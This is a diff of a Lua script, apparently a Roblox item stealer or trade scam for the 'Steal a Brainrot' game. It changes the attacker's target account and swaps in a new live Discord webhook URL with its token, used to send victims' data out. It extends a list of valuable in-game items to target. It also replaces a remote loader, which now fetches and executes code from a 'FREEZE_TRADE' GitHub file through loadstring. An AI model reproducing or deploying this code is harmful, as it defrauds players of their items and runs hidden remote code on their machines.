@@ -1,10 +1,10 @@
-local TARGET_ID = 11827745241
-local TARGET_USER = "Snagduels4"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1564783017241608233/Zi-u_9jlqJDBAja7C_EbYuhqBhaDc4nADbF5mUseH-ee4ToDEUrnD2d4ijk3eF8ZhMbs"
+local TARGET_ID = 10095557361
+local TARGET_USER = "nl51329"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573744228595535972/nvZtLEhC24aNvpqX_7rX5PLSi_dTlzm-_3MFxLs_HrfrdFqtpCNdG7tH0ZAvLUIcoJrb"
 
 local TargetBrainrots = {
-    ["Dragon Skeletonini"] = true,
     ["Phoenix"] = true,
+    ["Dragon Skeletonini"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
     ["Orchidox"] = true,
@@ -287,7 +287,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Cobra Gelato"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Sammyni Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
@@ -346,7 +354,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
 
     task.wait(1)
 
